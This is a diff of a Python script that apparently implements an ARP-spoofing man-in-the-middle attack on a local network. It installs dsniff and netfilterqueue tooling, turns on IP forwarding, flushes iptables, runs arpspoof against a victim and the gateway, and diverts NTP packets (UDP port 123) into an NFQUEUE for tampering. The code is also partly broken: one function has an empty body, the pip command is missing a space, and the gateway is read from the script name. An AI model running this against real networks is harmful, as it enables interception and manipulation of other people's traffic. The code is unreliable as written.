@@ -137,28 +137,30 @@ def main():  # no arguments
     
     
     
-    
-    
-    def package_installation(self):
-    self.apt = "apt "
-    self.ins = "install "
-    self.packages = ""
-
-    self.color.print_green("[+] Installation of the ubuntu packages is starting:")
-
-    for self.items in self.packages.split():
-        self.command = str(self.apt) + str(self.ins) + str(self.items)
-
-        subprocess.run(self.command.split())
-        self.color.print_blue("\t[+] Package [{}] Installed".format(str(self.items)))
-    
-    
-    
-    
     """
+    def check_packages():
+
+    
+    def package_installation(packages=None):
+        apt = "apt-get "
+        ins = "install "
+        packages = "dsniff libnetfilter-queue-dev python3 python3-pip"
+        pipi = "netfilterqueue kamene"
+        print("[+] Installation of the ubuntu packages is starting:")
+        
+        for items in packages.split():
+            command = apt + ins + str(items)
+            subprocess.run(command.split())
+            print("\t[+] Package [{}] Installed".format(str(items)))
+        for item in pipi.split():
+            commando = "pip3" + ins + str(item)
+            subprocess.run(commando.split())
+        
+
 
     gateway = sys.argv[0]
     vict = sys.argv[1]
+    package_installation()
     os.system(" echo 1 > /proc/sys/net/ipv4/ip_forward")
     os.system('iptables -F -vt raw')  # flush existing IP tables
     """
@@ -169,7 +171,7 @@ def main():  # no arguments
     q = Popen(['arpspoof', '-t', vict, gateway], stderr=DEVNULL, stdout=DEVNULL)
     os.system('iptables -t raw -A PREROUTING -p udp -d ' + gateway + ' --sport 123 -j NFQUEUE --queue-num 99')
     """
-    -t : tables we use raw: for nfqueue types - prerouting (for packets arriving from any network interface) and output
+    -t : tables; we use raw: for nfqueue types - prerouting (for packets arriving from any network interface) and output
     -A : Append rule to the said table
     -p : protocol
     -d : dest address /mask
